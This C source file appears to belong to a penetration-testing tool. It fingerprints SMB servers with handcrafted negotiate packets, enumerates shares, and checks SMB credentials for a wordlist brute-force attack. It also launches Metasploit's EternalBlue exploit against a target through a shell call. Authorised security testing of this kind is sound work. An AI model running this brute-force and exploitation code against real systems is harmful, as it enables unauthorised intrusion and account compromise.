
#include <samba-4.0/libsmbclient.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "../auditing-cybersecurity.h"
#include "../others/networking.h"
#include "activities.h"
#include <errno.h>

char *gWorkgroup="";
char *gUsername="";
char *gPassword="";
char *gServer=target.strTargetIp;


static void smbc_auth_fn(const char *server, const char *share, char *wrkgrp, int wrkgrplen, char *user,
		int userlen, char *passwd, int passwdlen){
	(void) server;
	(void) share;
	(void) wrkgrp;
	(void) wrkgrplen;
	strncpy(wrkgrp,gWorkgroup,wrkgrplen-1); wrkgrp[wrkgrplen-1]=0;
	strncpy(user,gUsername,userlen-1); user[userlen-1]=0;
	strncpy(passwd,gPassword,passwdlen-1); passwd[passwdlen-1]=0;
}

static SMBCCTX* create_smbctx(void){
	SMBCCTX	*ctx=NULL;
	if((ctx=smbc_new_context())==NULL){
		smbc_free_context(ctx, 1);
		return NULL;
	}
	smbc_setFunctionAuthData(ctx, smbc_auth_fn);
	if(smbc_init_context(ctx) == NULL){
		smbc_free_context(ctx, 1);
		return NULL;
	}
	return ctx;
}

static int validate_smb_account(SMBCCTX *ctx, char *smbURL){
	SMBCFILE *dir=NULL;
	if((dir=smbc_getFunctionOpendir(ctx)(ctx, smbURL))==NULL) return false;
	char fullPath[128]="";
	struct smbc_dirent *dirent;
	bool found=false;
	while((dirent = smbc_getFunctionReaddir(ctx)(ctx, dir)) != NULL){
		snprintf(fullPath,128,"%s/%s",smbURL,dirent->name);
		if((smbc_getFunctionOpendir(ctx)(ctx, fullPath))!=NULL){
			printf(REMOVE_LINE);
			printf("  %sUser found: %s%s/%s with access to %s%s",C_HWHITE,C_HRED,gUsername,gPassword, fullPath,C_DEFAULT);
			printf("\n\n"REMOVE_LINE);
			found=true;
		}
	}
	smbc_getFunctionClose(ctx)(ctx, dir);
	return found;
}

static void delete_smbctx(SMBCCTX* ctx){
	smbc_free_context(ctx, 1);
}

int smb_check_user(char *username, char *password){
	SMBCCTX *ctx;
	gUsername=username;
	gPassword=password;
	char smbURL[BUFFER_SIZE_1K]="";
	snprintf(smbURL, sizeof(smbURL), "smb://%s:%d", target.strTargetIp,portUnderHacking);
	if ((ctx=create_smbctx())==NULL) return set_last_activity_error(SMB_CONTEXT_CREATION_ERROR,"");
	if(validate_smb_account(ctx, smbURL)){
		delete_smbctx(ctx);
		return true;
	}
	delete_smbctx(ctx);
	return false;
}

static int smb_list_resources(){
	SMBCCTX *ctx;
	char smbURL[BUFFER_SIZE_1K]="";
	snprintf(smbURL, sizeof(smbURL), "smb://%s:%d", target.strTargetIp,portUnderHacking);
	if ((ctx=create_smbctx())==NULL) return set_last_activity_error(SMB_CONTEXT_CREATION_ERROR,"");
	SMBCFILE *dir;
	struct smbc_dirent *dirent;
	if((dir=smbc_getFunctionOpendir(ctx)(ctx, smbURL)) != NULL){
		while((dirent = smbc_getFunctionReaddir(ctx)(ctx, dir)) != NULL){
			printf("  Name: %s%s%s\n", C_HWHITE, dirent->name,C_DEFAULT);
			printf("  Type: %s%s%s\n", C_HWHITE,dirent->smbc_type == SMBC_FILE_SHARE ? "Share" : "Directory",C_DEFAULT);
			printf("  Comment: %s%s%s\n", C_HWHITE,dirent->comment ? dirent->comment : "",C_DEFAULT);
			printf("\n");
		}
		smbc_getFunctionClose(ctx)(ctx, dir);
		delete_smbctx(ctx);
		return true;
	}
	delete_smbctx(ctx);
	return false;
}

static int smb_banner_grabbing(){
	int smbConn=0, bytesReceived=0;
	long int payloadLen=0;
	unsigned char *serverResp=NULL;
	bool supported=false;
	char smbv1Dialects[10][BUFFER_SIZE_32B]={
			"PC NETWORK PROGRAM 1.0",
			"MICROSOFT NETWORKS 1.03",
			"MICROSOFT NETWORKS 3.0",
			"LANMAN1.0",
			"LM1.2X002",
			"NT LANMAN 1.0",
			"NT LM 0.12",
			"LANMAN2.1",
			"SAMBA",
			"CIFS"
	};
	char payloadSmbv1[]={
			0x00,0x00,0x00,0xB5, // 32 + 2 + body + 1
			0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x28,0x00,0x00,0x00,0x00,
			0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc4,0xb2,0x00,0x00,0x34,0x4a,
			0x00,0x92, //body
			0x00,0x02,'P','C',' ','N','E','T','W','O','R','K',' ','P','R','O','G','R','A','M',' ','1','.','0', //24
			0x00,0x02,'M','I','C','R','O','S','O','F','T',' ','N','E','T','W','O','R','K','S',' ','1','.','0','3', //25
			0x00,0x02,'M','I','C','R','O','S','O','F','T',' ','N','E','T','W','O','R','K','S',' ','3','.','0', //24
			0x00,0x02,'L','A','N','M','A','N','1','.','0', //11
			0x00,0x02,'L','M','1','.','2','X','0','0','2', //11
			0x00,0x02,'N','T',' ','L','A','N','M','A','N',' ','1','.','0', //15
			0x00,0x02,'N','T',' ','L','M',' ','0','.','1','2', //12
			0x00,0x02,'L','A','N','M','A','N','2','.','1', //11
			0x00,0x02,'S','A','M','B','A', //7
			0x00,0x02,'C','I','F','S', //6
			0x00};
	payloadLen=185;
	bytesReceived=send_msg_to_server(&smbConn, target.targetIp, NULL, portUnderHacking,
			target.ports[portUnderHacking].connectionType,
			payloadSmbv1, payloadLen, &serverResp, BUFFER_SIZE_16K, 0);
	if(bytesReceived>0 && serverResp[5]=='S' && serverResp[6]=='M' && serverResp[7]=='B'){
		int preferedDialectIndex=serverResp[37]+serverResp[38];
		if(bytesReceived>0 && preferedDialectIndex!=510){
			printf("%s  SMBv1:%s supported %s\n", C_HWHITE,C_HRED,C_DEFAULT);
			printf("\n    - Preferred dialect: %s%s%s\n",C_HWHITE, smbv1Dialects[preferedDialectIndex], C_DEFAULT);
			printf("\n    - Security Mode: %s0x%02X%s (0x01: User Level access, 0x02: supports challenge/response authentication,"
					" 0x04: supports SMB security signatures, 0x08: server requires security signatures)\n",C_HWHITE, serverResp[39],
					C_DEFAULT);
			char payload[]={
					0x00,0x00,0x00,0x8f,0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,
					0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
					0x24,0x31,0x00,0x00,0xc0,0xa9,0x0c,0xff,0x00,0x00,0x00,0xdf,0xff,0x02,0x00,
					0x01,0x00,0x8a,0x16,0x00,0x00,0x31,0x00,0x00,0x00,0x00,0x00,0xd4,0x00,0x00,
					0x80,0x54,0x00,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x01,0x00,0x00,0x00,
					0x05,0x02,0x88,0xa2,0x01,0x00,0x01,0x00,0x20,0x00,0x00,0x00,0x10,0x00,0x10,
					0x00,0x21,0x00,0x00,0x00,0x2e,0x52,0x67,0x4f,0x6d,0x42,0x43,0x36,0x57,0x64,
					0x4f,0x32,0x57,0x6f,0x44,0x72,0x49,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,
					0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00,0x57,0x69,0x6e,0x64,0x6f,
					0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00};
			payloadLen=147;
			free(serverResp);
			bytesReceived=send_msg_to_server(&smbConn,target.targetIp, NULL, portUnderHacking,
					target.ports[portUnderHacking].connectionType,
					payload, payloadLen, &serverResp, BUFFER_SIZE_16K, 0);
			if(bytesReceived==RETURN_ERROR){
				error_handling(0,false);
			}else{
				int pos=9, lenght=0;
				unsigned char buffer[5];
				snprintf((char*) buffer,5,"%x%x",serverResp[36+8],serverResp[36+7]);
				int sbStart=36+7+1;
				int sbEnd=sbStart+strtoul((char*) buffer,NULL,16);
				if(strtoul((char*) buffer,NULL,16)!=0){
					pos=sbStart+57;
					printf("\n    - Target Name: %s",C_HWHITE);
					while(serverResp[++pos]!=0x02) if(serverResp[pos]!=0) printf("%c",serverResp[pos]);
					PRINT_RESET;
					printf("\n    - NetBIOS Domain Name/Computer Name: %s",C_HWHITE);
					pos+=4;
					lenght=serverResp[pos-2];
					for(int i=0;i<lenght;i++,pos++) if(serverResp[pos]!=0) printf("%c",serverResp[pos]);
					printf("/");
					pos+=4;
					lenght=serverResp[pos-2];
					for(int i=0;i<lenght;i++,pos++) if(serverResp[pos]!=0) printf("%c",serverResp[pos]);
					PRINT_RESET;
					printf("\n    - DNS Domain Name/Computer Name: %s",C_HWHITE);
					pos+=4;
					lenght=serverResp[pos-2];
					for(int i=0;i<lenght;i++,pos++) if(serverResp[pos]!=0) printf("%c",serverResp[pos]);
					printf("/");
					pos+=4;
					lenght=serverResp[pos-2];
					for(int i=0;i<lenght;i++,pos++) if(serverResp[pos]!=0) printf("%c",serverResp[pos]);
					PRINT_RESET;
				}
				int os=sbEnd+3;
				pos=os-1;
				printf("\n    - Native OS: %s",C_HWHITE);
				while(serverResp[++pos]!=0x00) printf("%c",serverResp[pos]);
				PRINT_RESET;
				printf("\n    - Native LAN Manager: %s",C_HWHITE);
				while(serverResp[++pos]!=0x00) printf("%c",serverResp[pos]);
				PRINT_RESET;
				printf("\n    - Primary Domain: %s",C_HWHITE);
				while(serverResp[++pos]!=0x00) printf("%c",serverResp[pos]);
				PRINT_RESET;
			}
		}else{
			printf("%s  SMBv1: %snot supported%s\n", C_HWHITE,C_HGREEN,C_DEFAULT);
		}
	}else{
		printf("%s  SMBv1: %snot supported%s\n", C_HWHITE,C_HGREEN,C_DEFAULT);
	}
	close(smbConn);
	smbConn=0;
	//v2
	supported=true;
	char payloadSmbv2[]={
			0x00,0x00,0x00,0x42,
			0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x28,0x00,0x00,0x00,0x00,
			0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc4,0xb2,0x00,0x00,0x34,0x4a,
			0x00,0x1f,
			0x00,0x02,'S','M','B',' ','2','.','0','.','2', //11
			0x00,0x02,'S','M','B',' ','2','.','0','0','2', //11
			0x00,0x02,'S','M','B',' ','2','.','1', //9
			0x00};
	payloadLen=70;
	free(serverResp);
	bytesReceived=send_msg_to_server(&smbConn,target.targetIp, NULL, portUnderHacking,
			target.ports[portUnderHacking].connectionType,
			payloadSmbv2, payloadLen, &serverResp, BUFFER_SIZE_16K, 0);
	if(bytesReceived>0) {
		// body start at 68
		char preferredDialect[BUFFER_SIZE_256B]="";
		switch(serverResp[73] + serverResp[72]){
		case 4:
			snprintf(preferredDialect, sizeof(preferredDialect),"%s","SMB 2.0.2");
			break;
		case 18:
			snprintf(preferredDialect, sizeof(preferredDialect),"%s","SMB 2.1");
			break;
		case 257:
			snprintf(preferredDialect, sizeof(preferredDialect),"%s","SMB2 wildcard");
			break;
		default:
			supported=false;
			printf("\n%s  SMBv2: %snot supported%s\n", C_HWHITE,C_HRED,C_DEFAULT);
			snprintf(preferredDialect, sizeof(preferredDialect),"%s (%02X %02X)","???",serverResp[73],serverResp[72]);
			break;
		}
		if(supported){
			printf("\n%s  SMBv2: %ssupported%s\n", C_HWHITE,C_HGREEN,C_DEFAULT);
			printf("\n    - Preferred dialect: %s%s%s\n",C_HWHITE, preferredDialect, C_DEFAULT);
			printf("\n    - Security Mode: %s0x%02X%s (0x01: security signatures enabled, 0x02: security signatures are required)\n",C_HWHITE, serverResp[70], C_DEFAULT);
		}
	}else{
		printf("\n%s  SMBv2: %snot supported%s\n", C_HWHITE,C_HRED,C_DEFAULT);
	}
	close(smbConn);
	smbConn=0;
	free(serverResp);
	//v3
	return RETURN_OK;
}

int smb(int type){
	char cmd[BUFFER_SIZE_1K]="";
	switch(type){
	case SMB_BANNER_GRABBING:
		smb_banner_grabbing();
		PRINT_RESET;
		(smb_list_resources())?(printf("  %sResources found:%s success %s\n",C_HWHITE, C_HRED,C_DEFAULT)):(printf("  %sResources found:%s failed %s\n",C_HWHITE,C_HGREEN,C_DEFAULT));
		break;
	case SMB_ETERNAL_BLUE:
		snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use windows/smb/ms17_010_eternalblue;set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
		system_call(cmd);
		break;
	case SMB_BFA:
		return bfa_init(0, "usernames_smb.txt", "passwords_smb.txt", SMB_BFA);
	default:
		break;
	}
	PRINT_RESET;
	return RETURN_OK;
}
